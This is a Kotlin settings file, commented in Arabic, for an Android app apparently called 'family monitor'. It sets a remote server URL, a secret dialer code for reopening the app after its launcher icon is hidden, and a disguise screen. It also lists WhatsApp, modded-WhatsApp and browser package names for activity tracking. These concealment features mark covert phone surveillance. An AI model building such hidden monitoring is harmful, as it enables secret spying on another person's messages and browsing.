package com.family.monitor

/**
 * الإعدادات الثابتة للتطبيق — عنوان الخادم المحروق داخل التطبيق.
 * التطبيق يعمل مباشرة على الخادم دون إدخال يدوي (يمكن تغييره يدويًا من شاشة الإعداد).
 */
object Config {
    /** عنوان الخادم المركزي (Vercel) */
    const val DEFAULT_SERVER_URL = "https://family-monitor.vercel.app"

    /** عنوان لوحة المتابعة الافتراضي للجهاز الأساسي */
    const val DEFAULT_PANEL_URL = "https://family-monitor.vercel.app"

    /**
     * الكود السري لفتح التطبيق بعد إخفاء الأيقونة:
     * يُكتب في لوحة الاتصال هكذا:  *#*#7594#*#*
     * يفتح شاشة التمويه (زر ← كلمة المرور ← الإعدادات).
     */
    const val SECRET_DIAL_CODE = "7594"

    /** اسم مكوّن أيقونة القاذف (Launcher) — نُعطّله لإخفاء الأيقونة ونفعّله لإظهارها */
    const val LAUNCHER_ALIAS = "com.family.monitor.LauncherAlias"

    // ---------- عائلة واتساب (الرسمي + النسخ المعدلة) ----------

    /** الحزم المعروفة لعائلة واتساب */
    val WHATSAPP_KNOWN = setOf(
        "com.whatsapp",            // WhatsApp الرسمي
        "com.whatsapp.w4b",        // WhatsApp Business
        "com.gbwhatsapp",          // GBWhatsApp
        "com.gbwhatsm",            // GBWhatsApp Pro
        "com.gbwhatsw4b",          // GBWhatsApp Business
        "com.fmwhatsapp",          // FMWhatsApp
        "com.yowhatsapp",          // YoWhatsApp
        "com.yowhatsm",            // YoWhatsApp Pro
        "com.whatsappplus",        // WhatsApp Plus
        "com.wplus",               // WAPlus
        "com.plus1.whatsapp",      // WhatsApp Plus variant
        "com.raWhatsApp",          // RAWhatsApp
        "com.rafalense.whatsapp",  // WA Plus Reborn
        "com.omarwhatsapp",        // Omar WhatsApp
        "com.heymods.whatsapp"     // HeyMods
    )

    /**
     * هل الحزمة من عائلة واتساب؟ (الرسمي + كل النسخ المعدلة)
     * كل النسخ المعدلة تحتفظ بكلمة whatsapp أو whats داخل اسم الحزمة،
     * فنستخدم المطابقة المعروفة + مطابقة عامة لتغطية أي نسخة جديدة.
     */
    fun isWhatsApp(pkg: String): Boolean {
        val p = pkg.lowercase().trim()
        if (p in WHATSAPP_KNOWN.map { it.lowercase() }) return true
        return p.contains("whats") || p.contains("w4b")
    }

    // ---------- المتصفحات المعروفة (تُستثنى من أحداث «التطبيقات» للتوفير) ----------

    val KNOWN_BROWSER_PACKAGES = setOf(
        "com.android.chrome", "com.chrome.beta", "com.chrome.dev", "com.chrome.canary",
        "com.google.android.googlequicksearchbox",
        "org.mozilla.firefox", "org.mozilla.focus", "org.mozilla.fenix", "org.mozilla.klar",
        "com.microsoft.emmx", "com.microsoft.emmx.beta",
        "com.opera.browser", "com.opera.mini", "com.opera.touch",
        "com.brave.browser", "com.sec.android.app.sbrowser", "com.sec.android.app.sbrowser.beta",
        "com.android.browser", "com.android.browser.beta",
        "com.ucbrowser.international", "com.UCMobile.intl",
        "com.vivaldi.browser", "org.torproject.torbrowser",
        "com.duckduckgo.mobile.android", "com.yandex.browser",
        "com.kiwibrowser.browser", "com.ecosia.android", "com.naver.whale",
        "com.cookiegames.smartcookie", "org.waterfox.project.waterfox",
        "com.linkbubble.playstore", "mark.via.gp", "com.mmbox.browser",
        "com.ghostery.android.ghostery", "com.tencent.mm.browser"
    )

    /** هل الحزمة متصفح معروف؟ (فتحها يظهر ضمن البحث/التصفح فلا نكرره في التطبيقات) */
    fun isKnownBrowser(pkg: String): Boolean = pkg.lowercase().trim() in KNOWN_BROWSER_PACKAGES
}
